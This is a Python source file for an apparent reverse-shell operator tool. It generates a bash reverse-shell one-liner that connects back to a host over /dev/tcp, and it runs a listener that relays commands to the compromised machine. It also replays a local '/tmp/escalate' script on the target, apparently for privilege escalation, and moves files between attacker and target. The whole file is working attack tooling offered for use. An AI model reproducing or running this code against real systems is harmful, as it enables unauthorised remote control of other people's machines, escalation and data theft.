from listener import PortListener
from cli import CLI
from file_transfer import FileTransfer


class ReverseShell:
    def __init__(self, host_ip, host_port, target_ip):
        self.host_ip = host_ip
        self.host_port = host_port
        self.target_ip = target_ip
        self.simple_reverse_shell_bash = "bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=host_ip, port=host_port)
        self.cli = CLI()
        self.cli.cli_print(self.simple_reverse_shell_bash)
        self.listener = PortListener(host_ip, host_port)
        self.running = True

    def handle_initial_data(self):
        initial_data = self.listener.receive_data()
        self.cli.cli_print(initial_data)

    def main_loop(self):
        new_command = self.cli.cli_prompt()
        new_command = self.handle_command(new_command)
        return_value = self.listener.send_receive(new_command)
        self.cli.cli_print(return_value)

    def handle_command(self, command):
        if command.lower() in ["bye"]:
            self.running = False
            return ""
        if command.lower() == "runfile":
            self.commands_from_local_file("/tmp/escalate")
            return ""
        if command.lower() == "fileupload":
            self.send_file("/tmp/escalate", "/tmp/escalate")
            return ""
        if command.lower() == "filedownload":
            self.receive_file("/tmp/escalate", "/tmp/escalate")
            return ""
        return command + "\n"

    def run(self):
        self.handle_initial_data()
        while self.running:
            self.main_loop()

    def commands_from_local_file(self, local_file):
        with open(local_file, "r") as run_this:
            for line in run_this.readlines():
                return_value = self.listener.send_receive(line)
                self.cli.cli_print(return_value)

    def send_file(self, source_file_path, destination_file_path):
        file_transfer = FileTransfer(self.host_ip, self.host_port + 1, self)
        file_transfer.host_to_target(source_file_path, destination_file_path)
        file_transfer.close()

    def receive_file(self, source_file_path, destination_file_path):
        file_transfer = FileTransfer(self.host_ip, self.host_port + 1, self)
        file_transfer.target_to_host(source_file_path, destination_file_path)
        file_transfer.close()
